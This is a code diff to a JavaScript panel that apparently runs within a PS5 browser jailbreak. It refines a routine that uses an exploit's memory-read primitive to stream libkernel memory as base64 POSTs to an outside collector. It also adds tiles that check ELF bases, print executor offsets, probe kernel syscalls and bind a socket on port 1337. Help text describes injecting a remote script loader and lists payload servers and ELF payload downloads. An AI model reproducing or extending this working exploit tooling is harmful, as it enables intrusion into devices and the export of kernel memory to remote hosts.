         if (!window.read_buffer) { out("DUMP", "window.read_buffer missing -- no memory primitive", "err"); return; }
 
         var total = len, done = 0;
-        DUMP = { run: true, sent: 0, bytes: 0, failed: 0, chunks: 0, t0: Date.now() };
+        DUMP = { run: true, sent: 0, bytes: 0, failed: 0, chunks: 0, t0: Date.now(), base0: heapNow(), stopped: "" };
         var session = FW + "-" + Date.now();
         out("DUMP", "streaming " + (which === "lk" ? "libkernel" : which) + " from " + hex(base)
-            + " : " + total + " bytes in " + chunk + "-byte chunks -> " + url.slice(0, 70)
+            + " : " + total + " bytes in " + chunk + "-byte chunks, gap " + gap + "ms -> " + url.slice(0, 70)
             + heapNote(), "sec");
 
         postText(url, "BAGA-BEGIN " + session + " fw=" + FW + " base=" + hex(base)
@@ -2512,6 +2797,18 @@
         (function step() {
             if (!DUMP.run) return;
             if (done >= total) return finish();
+            /* THE WATCHDOG. Measured before every chunk: if the live heap has grown past the
+             * ceiling the dump stops with a NAMED verdict instead of taking the tab down. */
+            if (DUMP.base0) {
+                var grew = heapNow() - DUMP.base0;
+                if (grew > DUMP_MAX_HEAP_GROWTH) {
+                    DUMP.stopped = "HEAP-WATCHDOG (+" + (grew / 1048576).toFixed(1) + " MB > "
+                        + (DUMP_MAX_HEAP_GROWTH / 1048576) + " MB) at " + done + " bytes";
+                    out("DUMP-OOM-GUARD", DUMP.stopped + " -- stopped on purpose; lower bytes/chunk or raise the gap", "err");
+                    DUMP.run = false;
+                    return finish();
+                }
+            }
             var n = Math.min(chunk, total - done), b;
             try {
                 b = window.read_buffer(base + B(done), n);
@@ -2519,7 +2816,13 @@
                 DUMP.failed++;
                 out("DUMP", "read threw at +" + hex(done) + ": " + String((e && e.message) || e).slice(0, 60), "err");
                 done += n;
-                return setTimeout(step, 0);
+                return setTimeout(step, gap);
+            }
+            if (!b || typeof b.length !== "number" || b.length === 0) {
+                DUMP.failed++;
+                out("DUMP", "read at +" + hex(done) + " returned nothing usable -- counted and skipped", "warn");
+                done += n;
+                return setTimeout(step, gap);
             }
             var payload = "BAGA " + hex(done) + " " + b.length + " " + b64(b) + "\n";
             b = null;                                   /* drop the chunk: nothing accumulates */
@@ -2529,21 +2832,25 @@
                 else { DUMP.failed++; }
                 payload = null;
                 done += n;
-                if (DUMP.chunks % 16 === 0)
+                if (DUMP.chunks % 32 === 0)
                     out("DUMP", done + "/" + total + " bytes, sent=" + DUMP.sent
                         + " failed=" + DUMP.failed + heapNote(), "dim");
-                setTimeout(step, 0);
+                setTimeout(step, gap);
             });
         })();
 
         function finish() {
             DUMP.run = false;
             var ms = Date.now() - DUMP.t0;
+            var grew = heapNow() && DUMP.base0 ? (heapNow() - DUMP.base0) : 0;
             postText(url, "BAGA-END " + session + " chunks=" + DUMP.chunks + " bytes=" + DUMP.bytes
                 + " failed=" + DUMP.failed + "\n", function () { });
             out("DUMP-VERDICT", "streamed " + DUMP.bytes + " bytes in " + DUMP.chunks + " chunks, "
-                + DUMP.sent + " delivered, " + DUMP.failed + " failed, in " + ms + " ms. "
-                + "Nothing was retained in memory. Check the collector for BAGA-BEGIN/BAGA/BAGA-END.",
+                + DUMP.sent + " delivered, " + DUMP.failed + " failed, in " + ms + " ms"
+                + (grew ? ", heap delta " + (grew / 1048576).toFixed(1) + " MB" : "")
+                + (DUMP.stopped ? ". STOPPED EARLY BY " + DUMP.stopped : "")
+                + ". Nothing was retained in memory: one chunk at a time, dropped after each POST. "
+                + "Check the collector for BAGA-BEGIN / BAGA / BAGA-END.",
                 DUMP.sent > 0 ? "ok" : "err");
             nres(DUMP.sent + " chunks sent (" + DUMP.bytes + "B)", "dump");
         }
@@ -2688,6 +2995,31 @@
             desc: "Read-only. Streams a bounded slice of libkernel to a POST target (webhook / LAN "
                 + "collector) in small chunks, one chunk in memory at a time and dropped after "
                 + "each POST -- so a large dump costs the same heap as a tiny one.",
+        },
+        {
+            id: "verify", label: "Verify bases (ELF)", run: pVerify,
+            desc: "Read-only. Reads the first bytes at the libkernel and libwebkit bases and "
+                + "checks the ELF magic 7f 45 4c 46. That pattern cannot be faked: it is the "
+                + "one proof that a base is a real mapping and not a plausible-looking word.",
+        },
+        {
+            id: "offtable", label: "Real offsets", run: pOffTable,
+            desc: "Read-only. Prints the actual numbers: every field of the live P2JB_LK row "
+                + "(the table the executor was initialised with) plus the offsets globals on "
+                + "this page. \"Show me real offsets\" answered with the values themselves.",
+        },
+        {
+            id: "umtx", label: "UMTX / kqueueex", run: pUmtx,
+            desc: "Read-only. Probes the other two documented kernel surfaces (0x1C6 "
+                + "SYS__UMTX_OP and 0x8D SYS_KQUEUEEX) ALL-ZERO, so nothing can arm: an op "
+                + "of 0 with a null address is an argument error, not a lock operation.",
+        },
+        {
+            id: "ftp", label: "Socket + files (FTP)", run: pFtp,
+            desc: "Read-only. Opens a REAL socket, binds 0.0.0.0:1337 and listens (the entry "
+                + "point an FTP server needs), then lists the process's own root with "
+                + "getdents. Everything is closed again. It does NOT run a server -- accept() "
+                + "blocks and this executor busy-spins the thread (see the verdict).",
         },
         {
             id: "exec", label: "Executor state", run: pExecutor,
@@ -2840,12 +3172,39 @@
     }
     try {
         document.getElementById("bwp-note").textContent =
-            "Read-only help: dump streams libkernel as BAGA-BEGIN / BAGA <off> <len> <base64> / BAGA-END "
-            + "posts you can reassemble offline; nothing is retained in memory. The loader injects a "
-            + "remote <script> (Y2JB remotejsloader pattern) at the same trust level as this page. "
-            + "Reference payload servers worth having on a LAN host: ps5-payload-dev/websrv (HTTP+webdav, "
-            + "port 8080), n0llptr/remote_lua_loader (lua payloads, incl. ftp_server.lua on port 1337).";
+            "Read-only help. The dump streams libkernel as BAGA-BEGIN / BAGA <off> <len> <base64> / "
+            + "BAGA-END posts you can reassemble offline; nothing is retained in memory, chunks are "
+            + "capped at 256 KB total / 8 KB each, a heap watchdog stops a runaway dump by itself, "
+            + "and the gap between chunks (floor 8 ms) is what actually lets GC run. "
+            + "The loader injects a remote <script> (Y2JB remotejsloader pattern) at the same trust "
+            + "level as this page. Reference payload servers worth having on a LAN host: "
+            + "ps5-payload-dev/websrv (HTTP+webdav, port 8080); the Lua route is NOT usable here -- "
+            + "n0llptr/remote_lua_loader needs a specific Artemis-engine game installed plus crafted "
+            + "savedata, so ftp_server.lua cannot run on this page. For FTP on the console use "
+            + "ftpsrv-ps5.elf above (WinSCP; FileZilla has known issues).";
     } catch (e) { }
+
+    /* ---- SHOW/HIDE THE TILES. The card grid is the only part of the panel that can get
+     * tall, so it is the thing with a toggle: header, log, footer stay, and "simple" is
+     * one tap away. The choice is remembered across reloads. */
+    var pvBtn = document.getElementById("bwp-payloadsbtn");
+    var topEl = document.getElementById("bwp-top");
+    var PVIDKEY = "bwslop_tiles_hidden";
+    function setTilesVisible(on) {
+        if (topEl) topEl.style.display = on ? "" : "none";
+        /* className, not classList: the headless harness stub models className only, and a
+         * layout tweak must never be the reason a test run dies. */
+        if (root) root.className = "bwp-root" + (on ? "" : " tiles-off");
+        if (pvBtn) pvBtn.textContent = on ? "hide tiles" : "show tiles";
+        try { localStorage.setItem(PVIDKEY, on ? "0" : "1"); } catch (e) { }
+    }
+    if (pvBtn && topEl) {
+        pvBtn.onclick = function () { setTilesVisible(topEl.style.display === "none"); };
+        var pvHidden = "0";
+        try { pvHidden = localStorage.getItem(PVIDKEY) || "0"; } catch (e) { }
+        setTilesVisible(pvHidden !== "1");
+        pvBtn.title = "show/hide the payload tiles (the grid is the only scrollable part of this page)";
+    }
 
     document.getElementById("bwp-dstart").onclick = function () { dumpStart(); };
     document.getElementById("bwp-dstop").onclick = function () {
@@ -2928,6 +3287,10 @@
                 var a2 = document.createElement("a");
                 a2.className = "bwp-lnk";
                 a2.href = "payloads/" + ELFS[ei][0];
+                /* DOWNLOAD, not navigate. Tapping a multi-megabyte ELF used to hand it to
+                 * the browser to render/navigate -- on a console that is its own OOM. The
+                 * download attribute makes it a file save instead. */
+                a2.setAttribute("download", ELFS[ei][0]);
                 a2.textContent = ELFS[ei][0];
                 a2.title = ELFS[ei][1];
                 pv.appendChild(a2);
